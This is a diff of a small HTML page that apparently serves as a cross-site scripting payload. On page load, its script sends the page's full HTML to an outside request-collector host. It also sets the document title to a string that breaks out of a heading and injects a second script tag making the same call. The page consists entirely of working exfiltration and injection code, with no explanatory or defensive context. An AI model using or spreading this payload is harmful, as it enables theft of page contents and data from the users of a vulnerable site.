@@ -2,10 +2,10 @@
   <body>
     <title>Something</title>
     <script>
-        fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {method:"POST", headers:new Headers({"Content-Type":"application/json"}), mode:"cors", body:JSON.stringify(document.documentElement.innerHTML)});
+        document.title = '</h1><script>fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {method:"POST", headers:new Headers({"Content-Type":"application/json"}), mode:"cors", body:JSON.stringify(document.documentElement.outerHTML)})';
     </script>
     <script>
-        document.title = '</h1><script>fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {method:"POST", headers:new Headers({"Content-Type":"application/json"}), mode:"cors", body:JSON.stringify(document.documentElement.innerHTML)})</script>';
+        fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {method:"POST", headers:new Headers({"Content-Type":"application/json"}), mode:"cors", body:JSON.stringify(document.documentElement.outerHTML)});
     </script>
   </body>
 </html>
